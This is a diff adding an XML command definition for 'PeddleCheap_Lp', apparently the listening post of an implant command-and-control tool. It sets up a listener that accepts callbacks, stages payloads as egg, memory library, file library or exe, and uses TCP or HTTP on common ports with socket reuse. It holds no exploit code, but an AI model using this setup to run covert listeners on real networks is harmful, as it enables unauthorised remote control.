@@ -1,0 +1,114 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Plugin providerName="PeddleCheap_Lp" providerType="module">
+
+    <Command name="Pc_listen" id="1">
+
+		<Help>Listens for a connection from PeddleCheap</Help>
+
+        <Input>
+			<Option name='key' optional='true'>
+				<Argument name='name' data='keyName'/>
+			</Option>
+			
+			<Option name='payload' optional='true'>
+				<Argument name='name' data='payloadName'/>
+			</Option>
+			
+			<Option name='run' optional='true'>
+				<Argument name='type'>
+					<Value string='egg'>
+						<Set data='runType' value='1'/>
+					</Value>
+					<Value string='memlib'>
+						<Set data='runType' value='2'/>
+					</Value>
+					<Value string='filelib'>
+						<Set data='runType' value='3'/>
+					</Value>
+					<Value string='exe'>
+						<Set data='runType' value='4'/>
+					</Value>
+				</Argument>
+				<Argument name='run_param' data='runParam' optional='true'/>
+			</Option>
+			
+			<Option name='tcp' group='protocol' optional='true'>
+				<Help>Use TCP protocol for communications</Help>
+
+				<Set data='protocol' value='0'/>
+				<Set data='listenPorts' value='443 80 53 1509'/>
+				
+				<Argument name='listenPorts' optional='true' data='listenPorts'/>
+			</Option>
+			
+			<Option name='http' group='protocol' optional='true'>
+				<Help>Use HTTP protocol for communications</Help>
+
+				<Set data='protocol' value='1'/>
+				<Set data='listenPorts' value='3005'/>
+				<Set data='listenPortsRemote' value='80 443'/>
+				<Set data='connectPrefix' value='TlEo:'/>
+				<Set data='connectAddress' value='127.0.0.1'/>
+				<Set data='maxConnectBytes' value='12288' />
+
+				<Argument name='listenPorts' optional='true' data='listenPorts'/>
+				<Argument name='listenPortsRemote' optional='true' data='listenPortsRemote' />
+				<Argument name='connectPrefix' optional='true' data='connectPrefix' />
+				<Argument name='connectAddress' optional='true' data='connectAddress' />
+				<Argument name='maxConnectBytes' optional='true' data='maxConnectBytes' />
+				
+			</Option>
+
+			<Option name='nolisten' group='protocol' optional='true'>
+				<Help>Handle socket reuse only</Help>
+				
+				<Set data='listenPorts' value=''/>
+				<Set data='reuse' value='true'/>
+			</Option>
+			
+			<Option name='reuse' optional='true'>
+				<Help>Listen for socket reuse transfer requests</Help>
+				<Set data='reuse' value='true'/>
+			</Option>
+			
+			
+			<Option name='autoAccept' optional='true'>
+				<Help>Automatically accept the first incoming connection</Help>
+				<Set data='autoaccept' value='true' />
+			</Option>
+			
+			<Option name='bind' optional='true'>
+				<Argument name='bindAddress' optional='false' data='bindAddress'/>
+			</Option>
+			
+			<Option name='verbose' optional='true'>
+				<Set param='verbose' value='true'/>
+			</Option>
+
+			<Option name='cpaddr' optional='true'>
+    			<Argument name='addr' data='cpAddr'/>
+				<Help>The CP address</Help>
+			</Option>
+        </Input>
+
+        <Output>
+			<Data name='protocol' type='uint8_t' default='0'/>
+			<Data name='keyName' type='string'/>
+			<Data name='payloadName' type='string'/>
+			<Data name='runType' type='uint8_t' default='0'/>
+			<Data name='runParam' type='string'/>
+			<Data name='listenPorts' type='string' default='443 80 53 1509'/>
+			<Data name='reuse' type='bool' default='false'/>
+			<Data name='autoaccept' type='bool' default='false' />
+			<Data name='listenPortsRemote' type='string' default='80 443' />
+			<Data name='connectPrefix' type='string' default='TlEo:' />
+			<Data name='connectAddress' type='string' default='127.0.0.1' />
+			<Data name='maxConnectBytes' type='uint16_t' default='12288' />
+			<Data name='verbose' type='bool' default='false'/>
+			<Data name='bindAddress' type='ipaddr' default='0.0.0.0' />
+			<Data name='cpAddr' type='cpaddr'/>
+        </Output>
+
+    </Command>
+
+</Plugin>
